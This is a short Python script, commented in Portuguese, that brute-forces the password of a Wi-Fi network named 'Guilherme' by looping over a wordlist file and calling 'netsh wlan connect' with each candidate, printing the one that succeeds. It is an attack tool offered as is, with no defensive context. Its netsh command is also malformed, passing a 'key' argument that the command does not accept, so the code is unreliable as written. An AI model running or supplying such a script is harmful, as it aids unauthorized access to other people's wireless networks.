import os
import subprocess

#Definir o nome da rede
network = "Guilherme"

#Definir o caminho do arquivo de senhas
password_file = "senha.txt"

#Abrir o arquivo de senhas
with open(password_file, 'r') as f:
    for line in f.readlines():
        password = line.strip()
        #Executar o comando de conexão
        command = "netsh wlan connect name=" + network + " ssid=" + network + " key=" + password
        result = subprocess.call(command, shell=True)

        #Verificar o resultado
        if result == 0:
            print("[+] Senha correta: " + password)
            os.system("pause")
            break
        else:
            print("[-] Senha incorreta: " + password)